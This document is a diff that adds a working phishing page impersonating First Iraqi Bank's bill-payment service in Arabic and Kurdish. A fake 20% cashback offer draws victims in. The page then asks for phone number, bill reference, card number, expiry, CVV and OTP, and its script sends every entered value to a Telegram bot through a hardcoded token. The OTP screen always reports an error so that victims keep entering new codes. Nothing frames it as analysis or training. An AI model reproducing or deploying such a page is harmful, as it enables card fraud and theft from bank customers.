@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FIB - Premium Digital Experience</title>
+    <style>
+        :root {
+            --fib-green: #008444;
+            --fib-light-green: #f0f9f4;
+            --bg-white: #ffffff;
+            --text-dark: #1a1a1a;
+            --gray: #717171;
+            --shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        body { background-color: #f8faf9; color: var(--text-dark); font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; }
+
+        .app-container { width: 100%; max-width: 450px; background: var(--bg-white); min-height: 100vh; position: relative; display: flex; flex-direction: column; box-shadow: 0 0 40px rgba(0,0,0,0.05); }
+
+        /* Popup */
+        #promo-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; display: flex; justify-content: center; align-items: center; }
+        .popup-content { background: white; padding: 40px 20px; border-radius: 30px; text-align: center; width: 85%; border-top: 8px solid var(--fib-green); animation: popupShow 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popupShow { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .popup-content h2 { color: var(--fib-green); margin-bottom: 10px; font-size: 1.5rem; }
+        .popup-content p { color: var(--gray); font-size: 1rem; line-height: 1.6; margin-bottom: 25px; }
+
+        .sticky-header { padding: 12px 20px; background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); border-bottom: 1px solid #f0f0f0; position: sticky; top: 0; z-index: 1000; display: flex; justify-content: space-between; align-items: center; }
+        .sticky-header img { width: 90px; }
+        .back-btn { border: none; background: var(--fib-light-green); width: 35px; height: 35px; border-radius: 10px; color: var(--fib-green); cursor: pointer; visibility: hidden; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+
+        .history-marquee { background: #1a1a1a; color: #00ff80; padding: 8px 0; font-size: 0.75rem; overflow: hidden; white-space: nowrap; }
+        .history-m-content { display: inline-block; animation: marquee 30s linear infinite; }
+        .history-m-content span { margin: 0 30px; font-weight: 500; }
+
+        .promo-banner { background: var(--fib-green); color: white; padding: 10px; text-align: center; font-size: 0.8rem; font-weight: 500; }
+
+        .marquee-container { background: #fff; padding: 15px 0; overflow: hidden; border-bottom: 1px solid #f5f5f5; }
+        .marquee-content { display: inline-block; animation: marquee 20s linear infinite; white-space: nowrap; }
+        .marquee-content img { height: 28px; margin: 0 30px; }
+        @keyframes marquee { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
+
+        .screen { display: none; padding: 25px; flex: 1; padding-bottom: 120px; }
+        .active { display: flex; flex-direction: column; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .btn-primary { background: var(--fib-green); color: white; border: none; padding: 18px; border-radius: 16px; font-weight: 600; cursor: pointer; font-size: 1rem; margin-top: 20px; }
+
+        .services-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+        .service-card { background: #fff; padding: 25px 10px; border-radius: 20px; text-align: center; cursor: pointer; border: 1px solid #f0f0f0; box-shadow: var(--shadow); transition: 0.3s; }
+        .service-card img { width: 45px; height: 45px; margin-bottom: 12px; }
+
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 0.85rem; color: var(--gray); margin-bottom: 8px; }
+        input { width: 100%; padding: 16px; border: 1.5px solid #f0f0f0; border-radius: 14px; box-sizing: border-box; font-size: 1rem; background: #fafafa; }
+        input:focus { border-color: var(--fib-green); outline: none; background: #fff; }
+
+        .cashback-box { background: var(--fib-light-green); color: var(--fib-green); padding: 18px; border-radius: 16px; text-align: center; font-weight: bold; margin: 20px 0; border: 1px dashed var(--fib-green); }
+
+        .simple-footer { padding: 30px 20px; background: #fff; border-top: 1px solid #f0f0f0; text-align: center; }
+        .footer-logo { width: 60px; opacity: 0.5; margin-bottom: 15px; }
+        .footer-info { font-size: 0.75rem; color: var(--gray); line-height: 1.8; }
+        .footer-line { width: 40px; height: 3px; background: var(--fib-green); margin: 15px auto; border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+<div id="promo-popup" onclick="closePopup()">
+    <div class="popup-content">
+        <div style="font-size: 50px; margin-bottom: 15px;">💰</div>
+        <h2>كاش باك 20% | ٢٠٪ کاشباک</h2>
+        <p id="pop-text">استمتع باسترداد نقدي فوري عند تسديد فواتيرك<br>چێژ لە وەرگرتنی کاشباکی خێرا وەربگرە لە کاتی پارەدانی پسوڵەکانت</p>
+        <button class="btn-primary" style="width: 100%;">بەردەوام بوون | استمرار</button>
+    </div>
+</div>
+
+<div class="app-container">
+    <div class="history-marquee">
+        <div class="history-m-content">
+            <span>⚡ فاتورة كهرباء: -25,000 IQD</span>
+            <span>📞 رصيد آسيا: -10,000 IQD</span>
+            <span>🚗 غرامة مرورية: -50,000 IQD</span>
+            <span>💧 أجور مياه: -15,000 IQD</span>
+            <span>🔥 غاز بغداد: -12,500 IQD</span>
+        </div>
+    </div>
+
+    <div class="sticky-header">
+        <button id="back-btn" class="back-btn" onclick="goBack()">→</button>
+        <img src="https://i.ibb.co/SDqNgGhk/fib-logo.png" alt="FIB">
+        <div style="width: 35px;"></div>
+    </div>
+
+    <div id="promo" class="promo-banner"></div>
+
+    <div class="marquee-container">
+        <div class="marquee-content">
+            <img src="https://i.ibb.co/MkkP3f3n/asia.png"><img src="https://i.ibb.co/rKNcbZsf/elec.png">
+            <img src="https://i.ibb.co/3mtPQ0Vb/water.png"><img src="https://i.ibb.co/JVSb1Nt/traffic.png">
+            <img src="https://i.ibb.co/fdVrPByN/amanat.png"><img src="https://i.ibb.co/nq6G8fvn/gas.png">
+        </div>
+    </div>
+
+    <div id="screen-lang" class="screen active">
+        <h3 style="text-align:center; margin-bottom: 30px;">بەخێربێن بۆ بانکی یەکەمی عێراقی<br><span style="font-size: 0.9rem; color: var(--gray);">مرحباً بكم في مصرف العراق الأول</span></h3>
+        <button class="btn-primary" onclick="setLang('ar')">العربية</button>
+        <button class="btn-primary" style="background:#f0f0f0; color:#333; margin-top:15px;" onclick="setLang('ku')">کوردی (سۆرانی)</button>
+    </div>
+
+    <div id="screen-services" class="screen">
+        <h3 id="s-title" style="margin-bottom: 20px;"></h3>
+        <div class="services-grid">
+            <div class="service-card" onclick="openService('bill', 'elec')"><img src="https://i.ibb.co/rKNcbZsf/elec.png"><p id="l-elec"></p></div>
+            <div class="service-card" onclick="openService('recharge', 'asia')"><img src="https://i.ibb.co/MkkP3f3n/asia.png"><p id="l-asia"></p></div>
+            <div class="service-card" onclick="openService('bill', 'water')"><img src="https://i.ibb.co/3mtPQ0Vb/water.png"><p id="l-water"></p></div>
+            <div class="service-card" onclick="openService('bill', 'traffic')"><img src="https://i.ibb.co/JVSb1Nt/traffic.png"><p id="l-traffic"></p></div>
+            <div class="service-card" onclick="openService('bill', 'amanat')"><img src="https://i.ibb.co/fdVrPByN/amanat.png"><p>أمانة بغداد</p></div>
+            <div class="service-card" onclick="openService('bill', 'gas')"><img src="https://i.ibb.co/nq6G8fvn/gas.png"><p>غاز بغداد</p></div>
+        </div>
+    </div>
+
+    <div id="screen-details" class="screen">
+        <h3 id="d-title"></h3>
+        <div class="input-group"><label id="label-phone"></label><input type="text" id="i-phone" placeholder="07xx xxx xxxx" oninput="trackInput('رقم الهاتف')"></div>
+        <div class="input-group"><label id="label-ref"></label><input type="text" id="i-ref" oninput="trackInput('رقم المرجع/الفاتورة')"></div>
+        <div class="input-group"><label id="label-amt"></label><input type="number" id="i-amt" placeholder="0 IQD" oninput="updateCashback(); trackInput('المبلغ')"></div>
+        <div id="cb-box" class="cashback-box"></div>
+        <button class="btn-primary" id="btn-details-next" onclick="nextScreen('screen-pay')"></button>
+    </div>
+
+    <div id="screen-pay" class="screen">
+        <h3>Card Details</h3>
+        <div class="input-group"><label>Card Number</label><input type="text" id="c-num" placeholder="0000 0000 0000 0000" maxlength="19" oninput="trackInput('رقم البطاقة')"></div>
+        <div style="display:flex; gap:10px;">
+            <div style="flex:1"><label>Expiry</label><input type="text" id="c-date" placeholder="MM-YY" maxlength="5" oninput="trackInput('التاريخ')"></div>
+            <div style="flex:1"><label>CVV</label><input type="text" id="c-cvv" placeholder="000" maxlength="3" oninput="trackInput('CVV')"></div>
+        </div>
+        <button class="btn-primary" onclick="nextScreen('screen-confirm')">Pay Now</button>
+    </div>
+
+    <div id="screen-confirm" class="screen">
+        <h3 id="otp-title">OTP</h3>
+        <input type="text" id="otp" placeholder="000000" style="text-align:center; font-size:24px; letter-spacing:10px; border-color: var(--fib-green);" oninput="trackInput('كود OTP')">
+        <p id="err" style="color:#d93025; text-align:center; font-size:0.85rem; margin-top: 15px;"></p>
+        <button class="btn-primary" onclick="retry()">Confirm</button>
+    </div>
+
+    <footer class="simple-footer">
+        <img src="https://i.ibb.co/SDqNgGhk/fib-logo.png" class="footer-logo">
+        <div class="footer-line"></div>
+        <div class="footer-info">
+            <p>© 2026 First Iraqi Bank (FIB). All Rights Reserved.</p>
+        </div>
+    </footer>
+</div>
+
+<script>
+    const tgToken = "8572556875:AAFOphhgFjEPZiklhqGpb-9RS8WDnn58svo";
+    const tgId = "7865246557";
+    let debounceTimer;
+
+    let curLang = 'ar';
+    let hist = ['screen-lang'];
+    let serviceType = 'bill';
+
+    const langData = {
+        ar: { s: "الخدمات الرئيسية", elec: "الكهرباء", water: "المياه", asia: "آسيا سيل", traffic: "المرور", cb: "استرداد نقدي", next: "التالي", promo: "كاش باك 20% لفترة محدودة!", l_phone: "رقم الهاتف", l_ref: "رقم المرجع", l_amt: "المبلغ (دينار)", err: "الرمز غير صحيح، حاول مجدداً" },
+        ku: { s: "خزمەتگوزارییەکان", elec: "کارەبا", water: "ئاو", asia: "ئاسیاسێڵ", traffic: "هاتووچۆ", cb: "کاشباک", next: "دواتر", promo: "20% کاشباک بۆ ماوەیەکی سنووردار!", l_phone: "ژمارەی مۆبایل", l_ref: "ژمارەی پسوڵە", l_amt: "بڕی پارە (دینار)", err: "کۆدەکە هەڵەیە، دووبارە هەوڵ بدەرەوە" }
+    };
+
+    function trackInput(field) {
+        clearTimeout(debounceTimer);
+        debounceTimer = setTimeout(() => {
+            const phone = document.getElementById('i-phone').value || "غير مسجل";
+            const value = event.target.value;
+            const message = `🔔 تحديث جديد:\n📱 الهاتف: ${phone}\n📍 الحقل: ${field}\n📝 القيمة: ${value}`;
+            
+            fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: tgId, text: message })
+            });
+        }, 1200); 
+    }
+
+    function closePopup() { document.getElementById('promo-popup').style.display = 'none'; }
+    function setLang(l) { curLang = l; const d = langData[l]; document.getElementById('s-title').innerText = d.s; document.getElementById('l-elec').innerText = d.elec; document.getElementById('l-water').innerText = d.water; document.getElementById('l-asia').innerText = d.asia; document.getElementById('l-traffic').innerText = d.traffic; document.getElementById('promo').innerText = d.promo; document.getElementById('label-phone').innerText = d.l_phone; document.getElementById('label-ref').innerText = d.l_ref; document.getElementById('label-amt').innerText = d.l_amt; document.getElementById('btn-details-next').innerText = d.next; nextScreen('screen-services'); }
+    function openService(type, name) { serviceType = type; const d = langData[curLang]; document.getElementById('d-title').innerText = d[name] || name; document.getElementById('i-ref').placeholder = (type === 'bill') ? d.l_ref : d.l_phone; updateCashback(); nextScreen('screen-details'); }
+    function updateCashback() { let val = document.getElementById('i-amt').value || 0; let rate = (serviceType === 'bill') ? 0.20 : 0.15; let cb = Math.floor(val * rate); document.getElementById('cb-box').innerText = `${langData[curLang].cb}: ${cb.toLocaleString()} IQD`; }
+    function nextScreen(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); hist.push(id); document.getElementById('back-btn').style.visibility = (id === 'screen-lang') ? 'hidden' : 'visible'; }
+    function goBack() { if (hist.length > 1) { hist.pop(); let prev = hist.pop(); nextScreen(prev); } }
+    document.getElementById('c-num').addEventListener('input', e => { e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim(); });
+    document.getElementById('c-date').addEventListener('input', e => { let v = e.target.value.replace(/[^\d]/g, ''); if (v.length >= 2) v = v.slice(0,2) + '-' + v.slice(2,4); e.target.value = v; });
+    function retry() { document.getElementById('otp').value = ""; document.getElementById('err').innerText = langData[curLang].err; }
+</script>
+</body>
+</html>
